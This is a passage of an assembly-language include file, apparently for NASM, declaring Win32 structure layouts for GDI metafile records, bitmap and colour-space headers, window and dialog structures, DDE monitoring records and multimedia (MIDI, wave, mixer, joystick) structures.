.caRedGamma RESW 1
.caGreenGamma RESW 1
.caBlueGamma RESW 1
.caReferenceBlack RESW 1
.caReferenceWhite RESW 1
.caContrast RESW 1
.caBrightness RESW 1
.caColorfulness RESW 1
.caRedGreenTint RESW 1
ENDSTRUC

STRUC DOCINFO
.cbSize RESD 1
.lpszDocName RESD 1
.lpszOutput RESD 1
ENDSTRUC

STRUC KERNINGPAIR
.wFirst RESW 1
.wSecond RESW 1
.iKernAmount RESD 1
ENDSTRUC

STRUC emr
.iType RESD 1
.nSize RESD 1
ENDSTRUC

STRUC emrtext
.ptlReference RESB POINT_size
.nchars RESD 1
.offString RESD 1
.fOptions RESD 1
.ircl RESD 1
.offDx RESD 1
ENDSTRUC

STRUC EMR
.iType RESD 1
.nSize RESD 1
ENDSTRUC

STRUC EMRABORTPATH
.emr RESB EMR_size
ENDSTRUC

STRUC EMRBEGINPATH
.emr RESB EMR_size
ENDSTRUC

STRUC EMRENDPATH
.emr RESB EMR_size
ENDSTRUC

STRUC EMRCLOSEFIGURE
.emr RESB EMR_size
ENDSTRUC

STRUC EMRFLATTENPATH
.emr RESB EMR_size
ENDSTRUC

STRUC EMRWIDENPATH
.emr RESB EMR_size
ENDSTRUC

STRUC EMRSETMETARGN
.emr RESB EMR_size
ENDSTRUC

STRUC EMREMRSAVEDC
.emr RESB EMR_size
ENDSTRUC

STRUC EMRREALIZEPALETTE
.emr RESB EMR_size
ENDSTRUC

STRUC EMRSELECTCLIPPATH
.emr RESB EMR_size
.iMode RESD 1
ENDSTRUC

STRUC EMRSETBKMODE
.emr RESB EMR_size
.iMode RESD 1
ENDSTRUC

STRUC EMRSETMAPMODE
.emr RESB EMR_size
.iMode RESD 1
ENDSTRUC

STRUC EMRSETPOLYFILLMODE
.emr RESB EMR_size
.iMode RESD 1
ENDSTRUC

STRUC EMRSETROP2
.emr RESB EMR_size
.iMode RESD 1
ENDSTRUC

STRUC EMRSETSTRETCHBLTMODE
.emr RESB EMR_size
.iMode RESD 1
ENDSTRUC

STRUC EMRSETTEXTALIGN
.emr RESB EMR_size
.iMode RESD 1
ENDSTRUC

STRUC EMRSETMITERLIMIT
.emr RESB EMR_size
.eMiterLimit RESQ 1
ENDSTRUC

STRUC EMRRESTOREDC
.emr RESB EMR_size
.iRelative RESD 1
ENDSTRUC

STRUC EMRSETARCDIRECTION
.emr RESB EMR_size
.iArcDirection RESD 1
ENDSTRUC

STRUC EMRSETMAPPERFLAGS
.emr RESB EMR_size
.dwFlags RESD 1
ENDSTRUC

STRUC EMRSETTEXTCOLOR
.emr RESB EMR_size
.crColor RESD 1
ENDSTRUC

STRUC EMRSETBKCOLOR
.emr RESB EMR_size
.crColor RESD 1
ENDSTRUC

STRUC EMRSELECTOBJECT
.emr RESB EMR_size
.ihObject RESD 1
ENDSTRUC

STRUC EMRDELETEOBJECT
.emr RESB EMR_size
.ihObject RESD 1
ENDSTRUC

STRUC EMRSELECTPALETTE
.emr RESB EMR_size
.ihPal RESD 1
ENDSTRUC

STRUC EMRRESIZEPALETTE
.emr RESB EMR_size
.ihPal RESD 1
.cEntries RESD 1
ENDSTRUC

STRUC EMRSETPALETTEENTRIES
.emr RESB EMR_size
.ihPal RESD 1
.iStart RESD 1
.cEntries RESD 1
.aPalEntries RESD 1
ENDSTRUC

STRUC EMRSETCOLORADJUSTMENT
.emr RESB EMR_size
.ColorAdjustment RESD 1
ENDSTRUC

STRUC EMRGDICOMMENT
.emr RESB EMR_size
.cbData RESD 1
.xData1 RESW 1
ENDSTRUC

STRUC EMREOF
.emr RESB EMR_size
.nPalEntries RESD 1
.offPalEntries RESD 1
.nSizeLast RESD 1
ENDSTRUC

STRUC EMRLINETO
.emr RESB EMR_size
.ptl RESB POINT_size
ENDSTRUC

STRUC EMRMOVETOEX
.emr RESB EMR_size
.ptl RESB POINT_size
ENDSTRUC

STRUC EMROFFSETCLIPRGN
.emr RESB EMR_size
.ptlOffset RESB POINT_size
ENDSTRUC

STRUC EMRFILLPATH
.emr RESB EMR_size
.rclBounds RESB RECT_size
ENDSTRUC

STRUC EMRSTROKEANDFILLPATH
.emr RESB EMR_size
.rclBounds RESB RECT_size
ENDSTRUC

STRUC EMRSTROKEPATH
.emr RESB EMR_size
.rclBounds RESB RECT_size
ENDSTRUC

STRUC EMREXCLUDECLIPRECT
.emr RESB EMR_size
.rclClip RESB RECT_size
ENDSTRUC

STRUC EMRINTERSECTCLIPRECT
.emr RESB EMR_size
.rclClip RESB RECT_size
ENDSTRUC

STRUC EMRSETVIEWPORTORGEX
.emr RESB EMR_size
.ptlOrigin RESB POINT_size
ENDSTRUC

STRUC EMRSETWINDOWORGEX
.emr RESB EMR_size
.ptlOrigin RESB POINT_size
ENDSTRUC

STRUC EMRSETBRUSHORGEX
.emr RESB EMR_size
.ptlOrigin RESB POINT_size
ENDSTRUC

STRUC EMRSETVIEWPORTEXTEX
.emr RESB EMR_size
.szlExtent RESD 1
ENDSTRUC

STRUC EMRSETWINDOWEXTEX
.emr RESB EMR_size
.szlExtent RESD 1
ENDSTRUC

STRUC EMRSCALEVIEWPORTEXTEX
.emr RESB EMR_size
.xNum RESD 1
.xDenom RESD 1
.yNum RESD 1
.yDemon RESD 1
ENDSTRUC

STRUC EMRSCALEWINDOWEXTEX
.emr RESB EMR_size
.xNum RESD 1
.xDenom RESD 1
.yNum RESD 1
.yDemon RESD 1
ENDSTRUC

STRUC EMRSETWORLDTRANSFORM
.emr RESB EMR_size
.xform RESD 1
ENDSTRUC

STRUC EMRMODIFYWORLDTRANSFORM
.emr RESB EMR_size
.xform RESD 1
.iMode RESD 1
ENDSTRUC

STRUC EMRSETPIXELV
.emr RESB EMR_size
.ptlPixel RESB POINT_size
.crColor RESD 1
ENDSTRUC

STRUC EMREXTFLOODFILL
.emr RESB EMR_size
.ptlStart RESB POINT_size
.crColor RESD 1
.iMode RESD 1
ENDSTRUC

STRUC EMRELLIPSE
.emr RESB EMR_size
.rclBox RESB RECT_size
ENDSTRUC

STRUC EMRRECTANGLE
.emr RESB EMR_size
.rclBox RESB RECT_size
ENDSTRUC

STRUC EMRROUNDRECT
.emr RESB EMR_size
.rclBox RESB RECT_size
.szlCorner RESD 1
ENDSTRUC

STRUC EMRARC
.emr RESB EMR_size
.rclBox RESB RECT_size
.ptlStart RESB POINT_size
.ptlEnd RESB POINT_size
ENDSTRUC

STRUC EMRARCTO
.emr RESB EMR_size
.rclBox RESB RECT_size
.ptlStart RESB POINT_size
.ptlEnd RESB POINT_size
ENDSTRUC

STRUC EMRCHORD
.emr RESB EMR_size
.rclBox RESB RECT_size
.ptlStart RESB POINT_size
.ptlEnd RESB POINT_size
ENDSTRUC

STRUC EMRPIE
.emr RESB EMR_size
.rclBox RESB RECT_size
.ptlStart RESB POINT_size
.ptlEnd RESB POINT_size
ENDSTRUC

STRUC EMRANGLEARC
.emr RESB EMR_size
.ptlCenter RESB POINT_size
.nRadius RESD 1
.eStartAngle RESQ 1
.eSweepAngle RESQ 1
ENDSTRUC

STRUC EMRPOLYLINE
.emr RESB EMR_size
.rclBounds RESB RECT_size
.cptl RESD 1
.aptl1 RESD 1
ENDSTRUC

STRUC EMRPOLYBEZIER
.emr RESB EMR_size
.rclBounds RESB RECT_size
.cptl RESD 1
.aptl1 RESD 1
ENDSTRUC

STRUC EMRPOLYGON
.emr RESB EMR_size
.rclBounds RESB RECT_size
.cptl RESD 1
.aptl1 RESD 1
ENDSTRUC

STRUC EMRPOLYBEZIERTO
.emr RESB EMR_size
.rclBounds RESB RECT_size
.cptl RESD 1
.aptl1 RESD 1
ENDSTRUC

STRUC EMRPOLYLINE16
.emr RESB EMR_size
.rclBounds RESB RECT_size
.cpts RESD 1
.apts1 RESD 1
ENDSTRUC

STRUC EMRPOLYBEZIER16
.emr RESB EMR_size
.rclBounds RESB RECT_size
.cpts RESD 1
.apts1 RESD 1
ENDSTRUC

STRUC EMRPOLYGON16
.emr RESB EMR_size
.rclBounds RESB RECT_size
.cpts RESD 1
.apts1 RESD 1
ENDSTRUC

STRUC EMRPLOYBEZIERTO16
.emr RESB EMR_size
.rclBounds RESB RECT_size
.cpts RESD 1
.apts1 RESD 1
ENDSTRUC

STRUC EMRPOLYLINETO16
.emr RESB EMR_size
.rclBounds RESB RECT_size
.cpts RESD 1
.apts1 RESD 1
ENDSTRUC

STRUC EMRPOLYDRAW
.emr RESB EMR_size
.rclBounds RESB RECT_size
.cptl RESD 1
.aptl1 RESD 1
.abTypes1 RESW 1
ENDSTRUC

STRUC EMRPOLYDRAW16
.emr RESB EMR_size
.rclBounds RESB RECT_size
.cpts RESD 1
.apts RESD 1
.abTypes RESW 1
ENDSTRUC

STRUC EMRPOLYPOLYLINE
.emr RESB EMR_size
.rclBounds RESB RECT_size
.nPolys RESD 1
.cptl RESD 1
.aPolyCounts RESD 1
.aptl RESD 1
ENDSTRUC

STRUC EMRPOLYPOLYGON
.emr RESB EMR_size
.rclBounds RESB RECT_size
.nPolys RESD 1
.cptl RESD 1
.aPolyCounts RESD 1
.aptl1 RESD 1
ENDSTRUC

STRUC EMRPOLYPOLYLINE16
.emr RESB EMR_size
.rclBounds RESB RECT_size
.nPolys RESD 1
.cpts RESD 1
.aPolyCounts RESD 1
.apts1 RESD 1
ENDSTRUC

STRUC EMRPOLYPOLYGON16
.emr RESB EMR_size
.rclBounds RESB RECT_size
.nPolys RESD 1
.cpts RESD 1
.aPolyCounts RESD 1
.apts1 RESD 1
ENDSTRUC

STRUC EMRINVERTRGN
.emr RESB EMR_size
.rclBounds RESB RECT_size
.cbRgnData RESD 1
.RgnData1 RESW 1
ENDSTRUC

STRUC EMRPAINTRGN
.emr RESB EMR_size
.rclBounds RESB RECT_size
.cbRgnData RESD 1
.RgnData1 RESW 1
ENDSTRUC

STRUC EMRFILLRGN
.emr RESB EMR_size
.rclBounds RESB RECT_size
.cbRgnData RESD 1
.ihBrush RESD 1
.RgnData RESW 1
ENDSTRUC

STRUC EMRFRAMERGN
.emr RESB EMR_size
.rclBounds RESB RECT_size
.cbRgnData RESD 1
.ihBrush RESD 1
.szlStroke RESD 1
.RgnData1 RESW 1
ENDSTRUC

STRUC EMREXTSELECTCLIPRGN
.emr RESB EMR_size
.cbRgnData RESD 1
.iMode RESD 1
.RgnData RESW 1
ENDSTRUC

STRUC EMREXTTEXTOUT
.emr RESB EMR_size
.rclBounds RESB RECT_size
.iGraphicsMode RESD 1
.exScale RESQ 1
.eyScale RESQ 1
.emrtext RESD 1
ENDSTRUC

STRUC EMRBITBLT
.emr RESB EMR_size
.rclBounds RESB RECT_size
.xDest RESD 1
.yDest RESD 1
.cxDest RESD 1
.cyDest RESD 1
.dwRop RESD 1
.xSrc RESD 1
.ySrc RESD 1
.xformSrc RESD 1
.crBkColorSrc RESD 1
.iUsageSrc RESD 1
.offBmiSrc RESD 1
.cbBmiSrc RESD 1
.offBitsSrc RESD 1
.cbBitsSrc RESD 1
ENDSTRUC

STRUC EMRSTRETCHBLT
.emr RESB EMR_size
.rclBounds RESB RECT_size
.xDest RESD 1
.yDest RESD 1
.cxDest RESD 1
.cyDest RESD 1
.dwRop RESD 1
.xSrc RESD 1
.ySrc RESD 1
.xformSrc RESD 1
.crBkColorSrc RESD 1
.iUsageSrc RESD 1
.offBmiSrc RESD 1
.cbBmiSrc RESD 1
.offBitsSrc RESD 1
.cbBitsSrc RESD 1
.cxSrc RESD 1
.cySrc RESD 1
ENDSTRUC

STRUC EMRMASKBLT
.emr RESB EMR_size
.rclBounds RESB RECT_size
.xDest RESD 1
.yDest RESD 1
.cxDest RESD 1
.cyDest RESD 1
.dwRop RESD 1
.xSrc2 RESD 1
.cyDest2 RESD 1
.dwRop2 RESD 1
.xSrc RESD 1
.ySrc RESD 1
.xformSrc RESD 1
.crBkColorSrc RESD 1
.iUsageSrc RESD 1
.offBmiSrc RESD 1
.cbBmiSrc RESD 1
.offBitsSrc RESD 1
.cbBitsSrc RESD 1
.xMask RESD 1
.yMask RESD 1
.iUsageMask RESD 1
.offBmiMask RESD 1
.cbBmiMask RESD 1
.offBitsMask RESD 1
.cbBitsMask RESD 1
ENDSTRUC

STRUC EMRPLGBLT
.emr RESB EMR_size
.rclBounds RESB RECT_size
.aptlDest3 RESD 1
.xSrc RESD 1
.ySrc RESD 1
.cxSrc RESD 1
.cySrc RESD 1
.xformSrc RESD 1
.crBkColorSrc RESD 1
.iUsageSrc RESD 1
.offBmiSrc RESD 1
.cbBmiSrc RESD 1
.offBitsSrc RESD 1
.cbBitsSrc RESD 1
.xMask RESD 1
.yMask RESD 1
.iUsageMask RESD 1
.offBmiMask RESD 1
.cbBmiMask RESD 1
.offBitsMask RESD 1
.cbBitsMask RESD 1
ENDSTRUC

STRUC EMRSETDIBITSTODEVICE
.emr RESB EMR_size
.rclBounds RESB RECT_size
.xDest RESD 1
.yDest RESD 1
.xSrc RESD 1
.ySrc RESD 1
.cxSrc RESD 1
.cySrc RESD 1
.offBmiSrc RESD 1
.cbBmiSrc RESD 1
.offBitsSrc RESD 1
.cbBitsSrc RESD 1
.iUsageSrc RESD 1
.iStartScan RESD 1
.cScans RESD 1
ENDSTRUC

STRUC EMRSTRETCHDIBITS
.emr RESB EMR_size
.rclBounds RESB RECT_size
.xDest RESD 1
.yDest RESD 1
.xSrc RESD 1
.ySrc RESD 1
.cxSrc RESD 1
.cySrc RESD 1
.offBmiSrc RESD 1
.cbBmiSrc RESD 1
.offBitsSrc RESD 1
.cbBitsSrc RESD 1
.iUsageSrc RESD 1
.dwRop RESD 1
.cxDest RESD 1
.cyDest RESD 1
ENDSTRUC

STRUC EMREXTCREATEFONTINDIRECT
.emr RESB EMR_size
.ihFont RESD 1
.elfw RESD 1
ENDSTRUC

STRUC EMRCREATEPALETTE
.emr RESB EMR_size
.ihPal RESD 1
.lgpl RESD 1
ENDSTRUC

STRUC EMRCREATEPEN
.emr RESB EMR_size
.ihPen RESD 1
.lopn RESD 1
ENDSTRUC

STRUC EMREXTCREATEPEN
.emr RESB EMR_size
.ihPen RESD 1
.offBmi RESD 1
.cbBmi RESD 1
.offBits RESD 1
.cbBits RESD 1
.elp RESD 1
ENDSTRUC

STRUC EMRCREATEBRUSHINDIRECT
.emr RESB EMR_size
.ihBrush RESD 1
.lb RESD 1
ENDSTRUC

STRUC EMRCREATEMONOBRUSH
.emr RESB EMR_size
.ihBrush RESD 1
.iUsage RESD 1
.offBmi RESD 1
.cbBmi RESD 1
.offBits RESD 1
.cbBits RESD 1
ENDSTRUC

STRUC EMRCREATEDIBPATTERNBRUSHPT
.emr RESB EMR_size
.ihBursh RESD 1
.iUsage RESD 1
.offBmi RESD 1
.cbBmi RESD 1
.offBits RESD 1
.cbBits RESD 1
ENDSTRUC

STRUC BITMAPV4HEADER
.bV4Size RESD 1
.bV4Width RESD 1
.bV4Height RESD 1
.bV4Planes RESW 1
.bV4BitCount RESW 1
.bV4V4Compression RESD 1
.bV4SizeImage RESD 1
.bV4XPelsPerMeter RESD 1
.bV4YPelsPerMeter RESD 1
.bV4ClrUsed RESD 1
.bV4ClrImportant RESD 1
.bV4RedMask RESD 1
.bV4GreenMask RESD 1
.bV4BlueMask RESD 1
.bV4AlphaMask RESD 1
.bV4CSType RESD 1
.bV4Endpoints RESD 1
.bV4GammaRed RESD 1
.bV4GammaGreen RESD 1
.bV4GammaBlue RESD 1
ENDSTRUC

STRUC FONTSIGNATURE
.fsUsb4 RESD 1
.fsCsb2 RESD 1
ENDSTRUC

STRUC CHARSETINFO
.ciCharset RESD 1
.ciACP RESD 1
.xlfs RESD 1
ENDSTRUC

STRUC LOCALESIGNATURE
.lsUsb4 RESD 1
.lsCsbDefault RESD 1
.lsCsbSupported RESD 1
ENDSTRUC

STRUC NEWTEXTMETRICEX
.ntmTm RESD 1
.ntmFontSig RESD 1
ENDSTRUC

STRUC ENUMLOGFONTEX
.elfLogFont RESD 1
.elfFullName RESB 1
.elfStyle RESB 1
.elfScript RESB 1
ENDSTRUC

STRUC GCP_RESULTS
.lStructSize RESD 1
.lpOutString RESD 1
.lpOrder RESD 1
.lpDX RESD 1
.lpCaretPos RESD 1
.lpClass RESD 1
.lpGlyphs RESD 1
.nGlyphs RESD 1
.nMaxFit RESD 1
ENDSTRUC

STRUC CIEXYZ
.ciexyzX RESD 1
.ciexyzY RESD 1
.ciexyzZ RESD 1
ENDSTRUC

STRUC CIEXYZTRIPLE
.ciexyzRed RESD 1
.ciexyzGreen RESD 1
.ciexyBlue RESD 1
ENDSTRUC

STRUC LOGCOLORSPACE
.lcsSignature RESD 1
.lcsVersion RESD 1
.lcsSize RESD 1
.lcsCSType RESD 1
.lcsIntent RESD 1
.lcsEndPoints RESD 1
.lcsGammaRed RESD 1
.lcsGammaGreen RESD 1
.lcsGammaBlue RESD 1
.lcsFileName RESB MAX_PATH
ENDSTRUC

STRUC EMRSELECTCOLORSPACE
.emr RESB EMR_size
.ihCS RESD 1
ENDSTRUC

STRUC EMRCREATECOLORSPACE
.emr RESB EMR_size
.ihCS RESD 1
.lcs RESD 1
ENDSTRUC

STRUC CBTACTIVATESTRUCT
.fMouse RESD 1
.hWndActive RESD 1
ENDSTRUC

STRUC EVENTMSG
.message RESD 1
.paramL RESD 1
.paramH RESD 1
.time RESD 1
.hwnd RESD 1
ENDSTRUC

STRUC CWPSTRUCT
.lParam RESD 1
.wParam RESD 1
.message RESD 1
.hwnd RESD 1
ENDSTRUC

STRUC DEBUGHOOKINFO
.hModuleHook RESD 1
.Reserved RESD 1
.lParam RESD 1
.wParam RESD 1
.code RESD 1
ENDSTRUC

STRUC MOUSEHOOKSTRUCT
.pt RESB POINT_size
.hwnd RESD 1
.wHitTestCode RESD 1
.dwExtraInfo RESD 1
ENDSTRUC

STRUC MINMAXINFO
.ptReserved RESB POINT_size
.ptMaxSize RESB POINT_size
.ptMaxPosition RESB POINT_size
.ptMinTrackSize RESB POINT_size
.ptMaxTrackSize RESB POINT_size
ENDSTRUC

STRUC COPYDATASTRUCT
.dwData RESD 1
.cbData RESD 1
.lpData RESD 1
ENDSTRUC

STRUC WINDOWPOS
.hwnd RESD 1
.hWndInsertAfter RESD 1
.x RESD 1
.y RESD 1
.lx RESD 1
.ly RESD 1
.flags RESD 1
ENDSTRUC

STRUC ACCEL
.fVirt RESB 1
.key RESW 1
.cmd RESW 1
ENDSTRUC

STRUC PAINTSTRUCT
.hdc RESD 1
.fErase RESD 1
.rcPaint RESB RECT_size
.fRestore RESD 1
.fIncUpdate RESD 1
.rgbReserved RESB 32 
ENDSTRUC

STRUC CREATESTRUCT
.lpCreateParams RESD 1
.hInstance RESD 1
.hMenu RESD 1
.hWndParent RESD 1
.ly RESD 1
.lx RESD 1
.y RESD 1
.x RESD 1
.style RESD 1
.lpszName RESD 1
.lpszClass RESD 1
.ExStyle RESD 1
ENDSTRUC

STRUC CBT_CREATEWND
.lpcs RESD 1
.hWndInsertAfter RESD 1
ENDSTRUC

STRUC WINDOWPLACEMENT
.iLength RESD 1
.flags RESD 1
.showCmd RESD 1
.ptMinPosition RESB POINT_size
.ptMaxPosition RESB POINT_size
.rcNormalPosition RESB RECT_size
ENDSTRUC

STRUC MEASUREITEMSTRUCT
.CtlType RESD 1
.CtlID RESD 1
.itemID RESD 1
.itemWidth RESD 1
.itemHeight RESD 1
.itemData RESD 1
ENDSTRUC

STRUC DRAWITEMSTRUCT
.CtlType RESD 1
.CtlID RESD 1
.itemID RESD 1
.itemAction RESD 1
.itemState RESD 1
.hwndItem RESD 1
.hDC RESD 1
.rcItem RESB RECT_size
.itemData RESD 1
ENDSTRUC

STRUC DELETEITEMSTRUCT
.CtlType RESD 1
.CtlID RESD 1
.itemID RESD 1
.hwndItem RESD 1
.itemData RESD 1
ENDSTRUC

STRUC COMPAREITEMSTRUCT
.CtlType RESD 1
.CtlID RESD 1
.hwndItem RESD 1
.itemID1 RESD 1
.itemData1 RESD 1
.itemID2 RESD 1
.itemData2 RESD 1
ENDSTRUC

STRUC DLGTEMPLATE
.style RESD 1
.dwExtendedStyle RESD 1
.cdit RESW 1
.x RESW 1
.y RESW 1
.lx RESW 1
.ly RESW 1
ENDSTRUC

STRUC DLGITEMTEMPLATE
.style RESD 1
.dwExtendedStyle RESD 1
.x RESW 1
.y RESW 1
.lx RESW 1
.ly RESW 1
.id RESW 1
ENDSTRUC

STRUC MENUITEMTEMPLATEHEADER
.versionNumber RESW 1
.loffset RESW 1
ENDSTRUC

STRUC MENUITEMTEMPLATE
.mtOption RESW 1
.mtID RESW 1
.mtString RESB 1
ENDSTRUC

STRUC ICONINFO
.fIcon RESD 1
.xHotspot RESD 1
.yHotspot RESD 1
.hbmMask RESD 1
.hbmColor RESD 1
ENDSTRUC

STRUC MDICREATESTRUCT
.szClass RESD 1
.szTitle RESD 1
.hOwner RESD 1
.x RESD 1
.y RESD 1
.lx RESD 1
.ly RESD 1
.style RESD 1
.lParam RESD 1
ENDSTRUC

STRUC CLIENTCREATESTRUCT
.hWindowMenu RESD 1
.idFirstChild RESD 1
ENDSTRUC

STRUC MULTIKEYHELP
.mkSize RESD 1
.mkKeylist RESB 1
.szKeyphrase RESB 253
ENDSTRUC

STRUC HELPWININFO
.wStructSize RESD 1
.x RESD 1
.y RESD 1
.lx RESD 1
.ly RESD 1
.wMax RESD 1
.rgchMember RESB 2
ENDSTRUC

STRUC DDEACK
.bAppReturnCode RESW 1
.Reserved RESW 1
.fbusy RESW 1
.fack RESW 1
ENDSTRUC

STRUC DDEADVISE
.Reserved RESW 1
.fDeferUpd RESW 1
.fAckReq RESW 1
.cfFormat RESW 1
ENDSTRUC

STRUC DDEDATA
.unused RESW 1
.fresponse RESW 1
.fRelease RESW 1
.Reserved RESW 1
.fAckReq RESW 1
.cfFormat RESW 1
.Value1 RESB 1
ENDSTRUC

STRUC DDEPOKE
.unused RESW 1
.fRelease RESW 1
.fReserved RESW 1
.cfFormat RESW 1
.Value1 RESB 1
ENDSTRUC

STRUC DDELN
.unused RESW 1
.fRelease RESW 1
.fDeferUpd RESW 1
.fAckReq RESW 1
.cfFormat RESW 1
ENDSTRUC

STRUC DDEUP
.unused RESW 1
.fAck RESW 1
.fRelease RESW 1
.fReserved RESW 1
.fAckReq RESW 1
.cfFormat RESW 1
.xRGB1 RESB 1
ENDSTRUC

STRUC HSZPAIR
.hszSvc RESD 1
.hszTopic RESD 1
ENDSTRUC

STRUC SECURITY_QUALITY_OF_SERVICE
.iLength RESD 1
.Impersonationlevel RESW 1
.ContextTrackingMode RESW 1
.EffectiveOnly RESD 1
ENDSTRUC

STRUC CONVCONTEXT
.cb RESD 1
.wFlags RESD 1
.wCountryID RESD 1
.iCodePage RESD 1
.dwLangID RESD 1
.dwSecurity RESD 1
.qos RESD 1
ENDSTRUC

STRUC CONVINFO
.cb RESD 1
.hUser RESD 1
.hConvPartner RESD 1
.hszSvcPartner RESD 1
.hszServiceReq RESD 1
.hszTopic RESD 1
.hszItem RESD 1
.wFmt RESD 1
.wType RESD 1
.wStatus RESD 1
.wConvst RESD 1
.wLastError RESD 1
.hConvList RESD 1
.ConvCtxt RESD 1
.hwnd RESD 1
.hwndPartner RESD 1
ENDSTRUC

STRUC DDEML_MSG_HOOK_DATA
.uiLo RESD 1
.uiHi RESD 1
.cbData RESD 1
.xData RESD 1
ENDSTRUC

STRUC MONMSGSTRUCT
.cb RESD 1
.hwndTo RESD 1
.dwTime RESD 1
.htask RESD 1
.wMsg RESD 1
.wParam RESD 1
.lParam RESD 1
.dmhd RESD 1
ENDSTRUC

STRUC MONCBSTRUCT
.cb RESD 1
.dwTime RESD 1
.htask RESD 1
.dwRet RESD 1
.wType RESD 1
.wFmt RESD 1
.hConv RESD 1
.hsz1 RESD 1
.hsz2 RESD 1
.hData RESD 1
.dwData1 RESD 1
.dwData2 RESD 1
.cc RESD 1
.cbData RESD 1
.xData8 RESD 1
ENDSTRUC

STRUC MONHSZSTRUCT
.cb RESD 1
.fsAction RESD 1
.dwTime RESD 1
.hsz RESD 1
.htask RESD 1
.xstr RESB 1
ENDSTRUC

STRUC MONERRSTRUCT
.cb RESD 1
.wLastError RESD 1
.dwTime RESD 1
.htask RESD 1
ENDSTRUC

STRUC MONLINKSTRUCT
.cb RESD 1
.dwTime RESD 1
.htask RESD 1
.fEstablished RESD 1
.fNoData RESD 1
.hszSvc RESD 1
.hszTopic RESD 1
.hszItem RESD 1
.wFmt RESD 1
.fServer RESD 1
.hConvServer RESD 1
.hConvClient RESD 1
ENDSTRUC

STRUC MONCONVSTRUCT
.cb RESD 1
.fConnect RESD 1
.dwTime RESD 1
.htask RESD 1
.hszSvc RESD 1
.hszTopic RESD 1
.hConvClient RESD 1
.hConvServer RESD 1
ENDSTRUC

STRUC smpte
.hour RESB 1
.minute RESB 1
.sec RESB 1
.frame RESB 1
.fps RESB 1
.dummy RESB 1
.pad RESB 1
ENDSTRUC

STRUC midi
.songptrpos RESD 1
ENDSTRUC

STRUC MMTIME
.wType RESD 1
.u RESD 1
ENDSTRUC

STRUC MIDIEVENT
.dwDeltaTime RESD 1
.dwStreamID RESD 1
.dwEvent RESD 1
.dwParms RESD 1
ENDSTRUC

STRUC MIDISTRMBUFFVER
.dwVersion RESD 1
.dwMid RESD 1
.dwOEMVersion RESD 1
ENDSTRUC

STRUC MIDIPROPTIMEDIV
.cbStruct RESD 1
.dwTimeDiv RESD 1
ENDSTRUC

STRUC MIDIPROPTEMPO
.cbStruct RESD 1
.dwTempo RESD 1
ENDSTRUC

STRUC MIXERCAPS
.wMid RESW 1
.wPid RESW 1
.vDriverVersion RESD 1
.szPname RESB MAXPNAMELEN
.fdwSupport RESD 1
.cDestinations RESD 1
ENDSTRUC

STRUC Target
.dwType RESD 1
.dwDeviceID RESD 1
.wMid RESW 1
.wPid RESW 1
.vDriverVersion RESD 1
.szPname RESB MAXPNAMELEN
ENDSTRUC

STRUC MIXERLINECONTROLS
.cbStruct RESD 1
.dwLineID RESD 1
.dwControl RESD 1
.cControls RESD 1
.cbmxctrl RESD 1
.pamxctrl RESD 1
ENDSTRUC

STRUC MIXERCONTROLDETAILS
.cbStruct RESD 1
.dwControlID RESD 1
.cChannels RESD 1
.item RESD 1
.cbDetails RESD 1
.paDetails RESD 1
ENDSTRUC

STRUC MIXERCONTROLDETAILS_BOOLEAN
.fValue RESD 1
ENDSTRUC

STRUC MIXERCONTROLDETAILS_SIGNED
.lValue RESD 1
ENDSTRUC

STRUC MIXERCONTROLDETAILS_UNSIGNED
.dwValue RESD 1
ENDSTRUC

STRUC JOYINFOEX
.dwSize RESD 1
.dwFlags RESD 1
.dwXpos RESD 1
.dwYpos RESD 1
.dwZpos RESD 1
.dwRpos RESD 1
.dwUpos RESD 1
.dwVpos RESD 1
.dwButtons RESD 1
.dwButtonNumber RESD 1
.dwPOV RESD 1
.dwReserved1 RESD 1
.dwReserved2 RESD 1
ENDSTRUC

STRUC DRVCONFIGINFO
.dwDCISize RESD 1
.lpszDCISectionName RESD 1
.lpszDCIAliasName RESD 1
.dnDevNode RESD 1
ENDSTRUC

STRUC WAVEHDR
.lpData RESD 1
.dwBufferiLength RESD 1
.dwBytesRecorded RESD 1
.dwUser RESD 1
.dwFlags RESD 1
.dwLoops RESD 1
.lpNext RESD 1
.Reserved RESD 1
ENDSTRUC

STRUC WAVEOUTCAPS
.wMid RESW 1
.wPid RESW 1
.vDriverVersion RESD 1
.szPname RESB MAXPNAMELEN
.dwFormats RESD 1
.wChannels RESW 1
.dwSupport RESD 1
ENDSTRUC

STRUC WAVEINCAPS
.wMid RESW 1
.wPid RESW 1
.vDriverVersion RESD 1
.szPname RESB MAXPNAMELEN
.dwFormats RESD 1
.wChannels RESW 1
ENDSTRUC

STRUC WAVEFORMAT
.wFormatTag RESW 1
.nChannels RESW 1
.nSamplesPerSec RESD 1
.nAvgBytesPerSec RESD 1
.nBlockAlign RESW 1
ENDSTRUC

STRUC PCMWAVEFORMAT
.wf RESD 1
.wBitsPerSample RESW 1
ENDSTRUC

STRUC MIDIOUTCAPS
.wMid RESW 1
.wPid RESW 1
.vDriverVersion RESD 1
.szPname RESB MAXPNAMELEN
.wTechnology RESW 1
.wVoices RESW 1
.wNotes RESW 1
.wChannelMask RESW 1
.dwSupport RESD 1
ENDSTRUC

STRUC MIDIINCAPS
.wMid RESW 1
.wPid RESW 1
.vDriverVersion RESD 1
.szPname RESB MAXPNAMELEN
ENDSTRUC

STRUC MIDIHDR
.lpData RESD 1
.dwBufferiLength RESD 1
.dwBytesRecorded RESD 1
.dwUser RESD 1
.dwFlags RESD 1
.lpNext RESD 1
.Reserved RESD 1
ENDSTRUC

STRUC AUXCAPS
.wMid RESW 1
.wPid RESW 1
.vDriverVersion RESD 1
.szPname RESB MAXPNAMELEN
.wTechnology RESW 1
.dwSupport RESD 1
ENDSTRUC

STRUC TIMECAPS
.wPeriodMin RESD 1
.wPeriodMax RESD 1
ENDSTRUC

STRUC JOYCAPS
.wMid RESW 1
.wPid RESW 1
.szPname RESB MAXPNAMELEN
.wXmin RESW 1
.wXmax RESW 1
.wYmin RESW 1
.wYmax RESW 1
.wZmin RESW 1
.wZmax RESW 1
.wNumButtons RESW 1
.wPeriodMin RESW 1
.wPeriodMax RESW 1
ENDSTRUC

STRUC JOYINFO
.wXpos RESW 1
.wYpos RESW 1
.wZpos RESW 1
.wButtons RESW 1
ENDSTRUC

STRUC MMIOINFO
.dwFlags RESD 1
.fccIOProc RESD 1
.pIOProc RESD 1
.wErrorRet RESD 1
.htask RESD 1
.cchBuffer RESD 1
.pchBuffer RESD 1
.pchNext RESD 1
.pchEndRead RESD 1
.pchEndWrite RESD 1
.lBufOffset RESD 1
.lDiskOffset RESD 1
.adwInfo4 RESD 1
.dwReserved1 RESD 1
